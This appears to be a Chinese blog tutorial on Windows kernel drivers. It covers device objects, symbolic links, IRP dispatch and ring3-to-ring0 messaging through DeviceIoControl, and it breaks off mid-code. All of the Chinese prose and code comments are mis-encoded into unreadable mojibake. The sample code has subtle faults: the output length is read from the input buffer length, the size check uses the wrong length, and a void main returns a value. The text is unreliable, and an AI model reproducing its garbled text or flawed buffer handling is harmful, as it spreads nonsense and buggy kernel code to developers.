<p>è®¾å¤‡åç§°çš„ä½œç”¨æ˜¯ç»™å†…æ ¸å¯¹è±¡ä½¿ç”¨çš„ï¼Œå¦‚æœè¦åœ¨Ring3è®¿é—® å¿…é¡»æœ‰ç¬¦å·é“¾æ¥(å¯ä»¥ç†è§£ä¸ºæ˜¯è®¾å¤‡çš„åˆ«å)ï¼Œæ²¡æœ‰è¿™ä¸ªåœ¨RIng3ä¸‹ä¸å¯è§</p>
<p>å†…æ ¸æ¨¡å¼ä¸‹ç¬¦å·é“¾æ¥åæ˜¯ä»¥<code>\??\</code>å¼€å¤´  å¦‚ Cç›˜å°±æ˜¯ <code>\??\C:</code></p>
<p>ç”¨æˆ·æ¨¡å¼ä¸‹ç¬¦å·é“¾æ¥ååˆ™æ˜¯ä»¥<code>\\.\</code>å¼€å¤´ å¦‚Cç›˜å°±æ˜¯ <code>\\.\C:</code></p>
<p>åœ¨å®é™…ä»£ç ä¸­éœ€è¦å¯¹ <code>\</code> è½¬ä¹‰ä¸º <code>\\</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">L&quot;\\??\\MyDriverDemo&quot;</span>   	\\??\MyDriverDemo</span><br><span class="line"><span class="string">L&quot;\\\\.\\MyDriverDemo&quot;</span>		\\.\MyDriverDemo</span><br><span class="line">PDEVICE_OBJECT dev = <span class="literal">NULL</span>;<span class="comment">//åˆå§‹åŒ– æ§åˆ¶è®¾å¤‡</span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">CreateDevice</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    NTSTATUS Status;	<span class="comment">//åˆå§‹åŒ–è¿”å›çŠ¶æ€</span></span><br><span class="line">    UNICODE_STRING DeviceName;	<span class="comment">// åˆ›å»ºè®¾å¤‡åç§°</span></span><br><span class="line">    UNICODE_STRING SymbolName;	<span class="comment">//ç¬¦å·é“¾æ¥</span></span><br><span class="line">    RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\MyDriverDemo&quot;</span>); <span class="comment">// è®¾å¤‡åç§° PDEVICE_OBJECT pDeviceObj = NULL;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆ›å»ºè®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    Status = IoCreateDevice(</span><br><span class="line">        DriverObject, <span class="comment">// è°ƒç”¨æ–¹é©±åŠ¨ç¨‹åºå¯¹è±¡</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;DeviceName, <span class="comment">// è®¾å¤‡åç§°</span></span><br><span class="line">        FILE_DEVICE_UNKNOWN, <span class="comment">// è®¾å¤‡ç±»å‹ï¼Œå½“å‰ä¸ä¸æŸä¸ªå…·ä½“è®¾å¤‡æŒ‚é’©ï¼Œæ‰€ä»¥ç±»å‹ä¸ºUNKNOWN </span></span><br><span class="line">        <span class="number">0</span>,<span class="comment">//FILE_DEVICE_SECURE_OPEN, // è®¾å¤‡å±æ€§ï¼Œå¤§å¤šæ•°é©±åŠ¨ç¨‹åºä»…æŒ‡å®š FILE_DEVICE_SECURE_OPEN å±æ€§ï¼Œ è¿™å¯ç¡®ä¿å°†ç›¸åŒçš„å®‰å…¨è®¾ç½®åº”ç”¨åˆ°è®¾å¤‡çš„å‘½åç©ºé—´ä¸­çš„ä»»ä½•æ‰“å¼€çš„è¯·æ±‚</span></span><br><span class="line">        TRUE,<span class="comment">//FALSE, // è®¾å¤‡å¯¹è±¡æ˜¯å¦è¡¨ç¤ºç‹¬å è®¾å¤‡ï¼Œå¦‚æœå¯ç”¨äº†å¯¹è®¾å¤‡çš„ç‹¬å è®¿é—®ï¼Œåˆ™ä¸€æ¬¡åªèƒ½æ‰“å¼€è®¾å¤‡çš„ä¸€ä¸ªå¥æŸ„ </span></span><br><span class="line">        &amp;dev <span class="comment">// åˆ›å»ºçš„è®¾å¤‡å¯¹è±¡ï¼ŒæŒ‡å‘æ¥æ”¶æŒ‡å‘æ–°åˆ›å»ºçš„ DEVICE_OBJECT ç»“æ„çš„æŒ‡é’ˆçš„å˜é‡çš„æŒ‡é’ˆ</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status))<span class="comment">//ä¸æˆåŠŸ</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (Status == STATUS_OBJECT_NAME_COLLISION)<span class="comment">//åç§°å†²çª</span></span><br><span class="line">			&#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[*]è®¾å¤‡åç§°å†²çª......\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]åˆ›å»ºå¤±è´¥&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//åˆå§‹åŒ–ç¬¦å·é“¾æ¥  (è®¾å¤‡åº”ç”¨ç¨‹åºä¸å¯è§ å› æ­¤é©±åŠ¨è¦æš´æ¼ä¸€ä¸ªç¬¦å·é“¾æ¥ç»™åº”ç”¨å±‚</span></span><br><span class="line">		RtlInitUnicodeString(&amp;SymbolName, SYMBOLLINK);</span><br><span class="line">		Status = IoCreateSymbolicLink(&amp;SymbolName, &amp;DeviceName);</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123; <span class="comment">//ä¸ç­‰äº0</span></span><br><span class="line">			IoDeleteDevice(dev); <span class="comment">//åˆ é™¤è®¾å¤‡</span></span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]åˆ é™¤è®¾å¤‡æˆåŠŸ&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[+]åˆ›å»ºç¬¦å·é“¾æ¥æˆåŠŸ&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="æ´¾é£å‡½æ•°ä¸IRPç±»å‹"><a href="#æ´¾é£å‡½æ•°ä¸IRPç±»å‹" class="headerlink" title="æ´¾é£å‡½æ•°ä¸IRPç±»å‹"></a>æ´¾é£å‡½æ•°ä¸IRPç±»å‹</h5><p>å½“å•å‡»é¼ æ ‡æ—¶ä¼šäº§ç”ŸMSGæ¶ˆæ¯ï¼Œè¯¥æ¶ˆæ¯å‘é€ç»™çª—å£å¯¹è±¡ï¼Œåœ¨çª—å£å¯¹è±¡å†…ä¼šæ ¹æ®æ¶ˆæ¯åºå·æ‰¾åˆ°å¯¹åº”çš„å¤„ç†å‡½æ•°è¿›è¡Œå¤„ç†ã€‚åŒç†ï¼Œåœ¨é©±åŠ¨ç¨‹åºä¸­ï¼Œå½“åœ¨3ç¯ä½¿ç”¨äº†æŸä¸ªå‡½æ•°å°±ä¼šäº§ç”ŸIRPæ¶ˆæ¯ï¼Œè¯¥æ¶ˆæ¯å‘é€ç»™è®¾å¤‡å¯¹è±¡ï¼Œåœ¨è®¾å¤‡å¯¹è±¡å†…ä¼šæ ¹æ®æ¶ˆæ¯ç±»å‹é€‰æ‹©å¯¹åº”çš„æ´¾é£å‡½æ•°å¤„ç†ã€‚</p>
<p><img src="/posts/dc4ad149/8.png" alt="img">                                         </p>
<p>å¸¸è§çš„IRPç±»å‹ä¸å…¶å¯¹åº”çš„3ç¯ä¸‹çš„å‡½æ•°åŠä½œç”¨å¦‚ä¸‹æ‰€ç¤º: </p>
<table>
<thead>
<tr>
<th>IRPç±»å‹</th>
<th>æ¥æºå‡½æ•°</th>
<th>å‡½æ•°ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>IRP_MJ_CREATE</td>
<td>CreateFile</td>
<td>æ‰“å¼€è®¾å¤‡</td>
</tr>
<tr>
<td>IRP_MJ_READ</td>
<td>ReadFile</td>
<td>ä»è®¾å¤‡ä¸­è¯»å–æ•°æ®</td>
</tr>
<tr>
<td>IRP_MJ_WRITE</td>
<td>WriteFile</td>
<td>ä»è®¾å¤‡ä¸­å†™å…¥æ•°æ®</td>
</tr>
<tr>
<td>IRP_MJ_CLOSE</td>
<td>CloseHandle</td>
<td>å…³é—­è®¾å¤‡</td>
</tr>
<tr>
<td>IRP_MJ_DEVICE_CONTROL</td>
<td>DeviceIoControl</td>
<td>è®¾å¤‡æ§åˆ¶ï¼Œæ¯”è¯»å–ã€å†™å…¥æ“ä½œæ›´åŠ çµæ´»</td>
</tr>
<tr>
<td>IRP_MJ_POWER</td>
<td>X</td>
<td>åœ¨æ“ä½œç³»ç»Ÿå¤„ç†ç”µæºæ¶ˆæ¯æ—¶äº§ç”Ÿè¯¥ç±»å‹</td>
</tr>
<tr>
<td>IRP_MJ_SHUTDOWN</td>
<td>X</td>
<td>å…³é—­ç³»ç»Ÿå‰ä¼šäº§ç”Ÿè¯¥ç±»å‹</td>
</tr>
</tbody></table>
<p>æƒ³æ³¨å†ŒæŸä¸ªIRPç±»å‹å¯¹åº”çš„æ´¾é£å‡½æ•°æ—¶å€™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ ¼å¼ :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRPç±»å‹] = æ´¾é£å‡½æ•°å</span><br></pre></td></tr></table></figure>

<p>//MajorFunctionæ˜¯ä¸€ä¸ªå…·æœ‰28ä¸ªæˆå‘˜çš„æ•°ç»„ å¯¹åº”ç€28ç§IRPç±»å‹</p>
<p><img src="/posts/dc4ad149/9.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE                   0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE_NAMED_PIPE        0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE                    0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_READ                     0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_WRITE                    0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_INFORMATION        0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_INFORMATION          0x06</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_EA                 0x07</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_EA                   0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_FLUSH_BUFFERS            0x09</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_VOLUME_INFORMATION   0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DIRECTORY_CONTROL        0x0c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_FILE_SYSTEM_CONTROL      0x0d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SHUTDOWN                 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_LOCK_CONTROL             0x11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLEANUP                  0x12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE_MAILSLOT          0x13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_SECURITY           0x14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_SECURITY             0x15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_POWER                    0x16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SYSTEM_CONTROL           0x17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CHANGE            0x18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_QUOTA              0x19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_QUOTA                0x1a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_PNP                      0x1b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_PNP_POWER                IRP_MJ_PNP      <span class="comment">// Obsolete....</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_MAXIMUM_FUNCTION         0x1b</span></span><br></pre></td></tr></table></figure>

<p>æ´¾é£å‡½æ•°ä¸€èˆ¬ä¹Ÿæ˜¯æœ‰å›ºå®šæ ¼å¼</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">MyDispatchFunction</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// ä¸šåŠ¡ä»£ç </span></span><br><span class="line">	<span class="comment">// è®¾ç½®è¿”å›çŠ¶æ€</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; </span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>; <span class="comment">// è¿”å›ç»™3ç¯å¤šå°‘æ•°æ®ï¼Œæ²¡æœ‰åˆ™å¡«0 </span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è¿™é‡Œä¸ºäº†æ–¹ä¾¿æ‰€æœ‰çš„è¯·æ±‚éƒ½ç”¨ä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œåœ¨å‡½æ•°å†…éƒ¨å»åŒºåˆ†è¯·æ±‚ï¼Œå†åšä¸åŒçš„é€»è¾‘å¤„ç†</span></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++)</span><br><span class="line">&#123;</span><br><span class="line">	DriverObject-&gt;MajorFunction[i] = MyDispatch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="çµæ´»é€šä¿¡"><a href="#çµæ´»é€šä¿¡" class="headerlink" title="çµæ´»é€šä¿¡"></a>çµæ´»é€šä¿¡</h5><h6 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h6><p>åœ¨åº”ç”¨å±‚ä½¿ç”¨DeviceIoControlå‡½æ•°å‘é©±åŠ¨å‘é€è¯·æ±‚ DeviceIoControlä¼šä½¿å†…æ ¸ä¸­çš„è®¾å¤‡å¯¹è±¡æ”¶åˆ°ä¸€ä¸ªè®¾å¤‡æ§åˆ¶è¯·æ±‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ©ç”¨CTL_CODEè¿™ä¸ªå®æ¥ç”Ÿæˆä¸€ä¸ªå­—èŠ‚è®¾å¤‡æ§åˆ¶è¯·æ±‚åŠŸèƒ½å·  0-7ffå·²è¢«å¾®è½¯ä¿ç•™ åªèƒ½ç”¨æ¯”è¿™ä¸ªå¤§çš„</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SENDSTR CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_WRITE_DATA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RECVSTR CTL_CODE(FILE_DEVICE_UNKNOWN,0x801,METHOD_BUFFERED,FILE_READ_DATA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEND_AND_RECV_STR CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_MAX_LEN 512 <span class="comment">//å®šä¹‰é“¾è¡¨ç¼“å†²åŒºæœ€å¤§é•¿åº¦</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å†…å­˜æ¸…é›¶åˆå§‹åŒ–å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initoutbuf</span><span class="params">(UCHAR buf[STR_MAX_LEN])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>) * STR_MAX_LEN);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//æ‰“å¼€è®¾å¤‡ L&quot;\\??\\MyDriverDemo&quot;   \\.\MyDriverDemo</span></span><br><span class="line">	HANDLE	device = CreateFileW(<span class="string">L&quot;\\\\.\\MyDriverDemo&quot;</span>, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (device == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*]è·å–é©±åŠ¨å¥æŸ„å¤±è´¥ï¼é”™è¯¯ï¼š%d\n&quot;</span>, GetLastError());</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//char* msg = &quot;[+]Ring3-&gt;Ring0&quot;;</span></span><br><span class="line">	UCHAR buffer[STR_MAX_LEN] ;<span class="comment">//åˆå§‹åŒ–è¿”å›æ•°æ®çš„ç¼“å†²åŒº</span></span><br><span class="line">	DWORD size = <span class="number">0</span>;</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">//ç»™é©±åŠ¨å‘é€è¯·æ±‚  DeviceIoControlä¼šä½¿å†…æ ¸ä¸­çš„è®¾å¤‡å¯¹è±¡æ”¶åˆ°ä¸€ä¸ªè®¾å¤‡æ§åˆ¶è¯·æ±‚</span></span><br><span class="line"></span><br><span class="line">	BOOL bRet = DeviceIoControl(device, SEND_AND_RECV_STR, <span class="string">&quot;Ring3-&gt;Ring0&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Ring3-&gt;Ring0&quot;</span>) + <span class="number">1</span>, (LPVOID)buffer, STR_MAX_LEN, &amp;size, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (bRet) &#123;		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+]æ¥æ”¶åˆ°R0å‘é€çš„æ¶ˆæ¯%s\r\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(device);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="å†…æ ¸"><a href="#å†…æ ¸" class="headerlink" title="å†…æ ¸"></a>å†…æ ¸</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ntddk.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰æ§åˆ¶ç </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SENDSTR CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_WRITE_DATA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RECVSTR CTL_CODE(FILE_DEVICE_UNKNOWN,0x801,METHOD_BUFFERED,FILE_READ_DATA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEND_AND_RECV_STR CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="comment">//å®šä¹‰ç¬¦å·é“¾æ¥å</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOLLINK <span class="string">L&quot;\\??\\MyDriverDemo&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_MAX_LEN 512 <span class="comment">//å®šä¹‰é“¾è¡¨ç¼“å†²åŒºæœ€å¤§é•¿åº¦</span></span></span><br><span class="line"></span><br><span class="line">PDEVICE_OBJECT dev = <span class="literal">NULL</span>;<span class="comment">//åˆå§‹åŒ– æ§åˆ¶è®¾å¤‡</span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">CreateDevice</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> &#123;</span><br><span class="line">	NTSTATUS Status;<span class="comment">//è¿”å›çŠ¶æ€</span></span><br><span class="line">	UNICODE_STRING DeviceName;<span class="comment">//è®¾å¤‡åç§°</span></span><br><span class="line">	UNICODE_STRING SymbolName;<span class="comment">//ç¬¦å·é“¾æ¥</span></span><br><span class="line">	RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\MyDriverDemo&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Status = IoCreateDevice(</span><br><span class="line">		DriverObject,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;DeviceName,</span><br><span class="line">		FILE_DEVICE_UNKNOWN,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		TRUE,</span><br><span class="line">		&amp;dev</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status))<span class="comment">//ä¸æˆåŠŸ</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (Status == STATUS_OBJECT_NAME_COLLISION)<span class="comment">//åç§°å†²çª</span></span><br><span class="line">			&#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[*]è®¾å¤‡åç§°å†²çª......\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]åˆ›å»ºå¤±è´¥&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//åˆå§‹åŒ–ç¬¦å·é“¾æ¥  (è®¾å¤‡åº”ç”¨ç¨‹åºä¸å¯è§ å› æ­¤é©±åŠ¨è¦æš´æ¼ä¸€ä¸ªç¬¦å·é“¾æ¥ç»™åº”ç”¨å±‚</span></span><br><span class="line">		RtlInitUnicodeString(&amp;SymbolName, SYMBOLLINK);</span><br><span class="line">		Status = IoCreateSymbolicLink(&amp;SymbolName, &amp;DeviceName);</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123; <span class="comment">//ä¸ç­‰äº0</span></span><br><span class="line">			IoDeleteDevice(dev); <span class="comment">//åˆ é™¤è®¾å¤‡</span></span><br><span class="line">			DbgPrint(<span class="string">&quot;[+]åˆ é™¤è®¾å¤‡æˆåŠŸ&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[+]åˆ›å»ºç¬¦å·é“¾æ¥æˆåŠŸ&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ´¾é£å‡½æ•°</span></span><br><span class="line">NTSTATUS <span class="title function_">MyDispatch</span><span class="params">(PDEVICE_OBJECT dev, PIRP pIrp)</span> &#123;</span><br><span class="line">	NTSTATUS Status = STATUS_SUCCESS;<span class="comment">//è¿”å›çŠ¶æ€</span></span><br><span class="line">	ULONG retLen = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(pIrp);	<span class="comment">//è·å–IRPæ•°æ®</span></span><br><span class="line">	ULONG uIoControlCode = IrpStack-&gt;Parameters.DeviceIoControl.IoControlCode; <span class="comment">//è·å–æ“ä½œç </span></span><br><span class="line">	</span><br><span class="line">	PVOID Outputbuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;<span class="comment">//è·å–ç¼“å†²åŒºåœ°å€(è¾“å…¥è¾“å‡ºçš„ç¼“å­˜åŒºéƒ½æ˜¯ä¸€ä¸ª,æ˜¯å…±äº«çš„)</span></span><br><span class="line">	PVOID Inputbuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	ULONG uDataInlen = IrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength; <span class="comment">//è·å–è¾“å…¥æ•°æ®çš„é•¿åº¦</span></span><br><span class="line">	ULONG uDataOutlen = IrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength; <span class="comment">//è·å–è¾“å‡ºæ•°æ®çš„é•¿åº¦</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IrpStack-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)&#123;</span><br><span class="line">		<span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">//case SENDSTR:</span></span><br><span class="line">			<span class="comment">//DbgPrint((char*)buffer);</span></span><br><span class="line">			<span class="comment">//retLen = uDataInlen;</span></span><br><span class="line">			<span class="comment">//break;</span></span><br><span class="line">		<span class="keyword">case</span> SEND_AND_RECV_STR:</span><br><span class="line">			<span class="keyword">if</span> (Inputbuffer != <span class="literal">NULL</span> &amp;&amp; uDataInlen &gt; <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[+]æ¥æ”¶åˆ°R3å‘é€çš„æ¶ˆæ¯:%s\r\n&quot;</span>, Inputbuffer);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (Outputbuffer != <span class="literal">NULL</span> &amp;&amp; uDataInlen &gt;= <span class="built_in">strlen</span>(<span class="string">&quot;Ring0-&gt;Ring3&quot;</span>) + <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="built_in">memcpy</span>(Outputbuffer, <span class="string">&quot;Ring0-&gt;Ring3&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Ring0-&gt;Ring3&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">				Status = STATUS_SUCCESS;</span><br><span class="line">				retLen = <span class="built_in">strlen</span>(<span class="string">&quot;Ring0-&gt;Ring3&quot;</span>) + <span class="number">1</span>;</span><br><span class="line">				<span class="comment">//DbgPrint(&quot;%s\r\n&quot;, Outputbuffer);</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="comment">//åˆ°è¿™é‡Œçš„è¯·æ±‚éƒ½æ˜¯ä¸æ¥å—çš„è¯·æ±‚ ä¸€å¾‹è¿”å›éæ³•å‚æ•°é”™è¯¯</span></span><br><span class="line">			Status = STATUS_INVALID_PARAMETER;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//ç»“æŸè¯·æ±‚ ç”¨è¿™ä¸ªinformationè®°å½•è¿”å›</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = retLen;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = Status;<span class="comment">// Ring3 GetLastError()</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);	<span class="comment">//å°†Irpè¿”å›ç»™IOç®¡ç†å™¨</span></span><br><span class="line">	<span class="keyword">return</span> Status;<span class="comment">//RIng3 DeviceIoControl()è¿”å›å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¸è½½å‡½æ•°</span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (DriverObject != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		UNICODE_STRING SymbolName; <span class="comment">//åˆå§‹åŒ–ç¬¦å·é“¾æ¥</span></span><br><span class="line">		RtlInitUnicodeString(&amp;SymbolName, SYMBOLLINK);</span><br><span class="line">		IoDeleteSymbolicLink(&amp;SymbolName); <span class="comment">//åˆ é™¤ç¬¦å·é“¾æ¥</span></span><br><span class="line">		<span class="keyword">if</span> (dev != <span 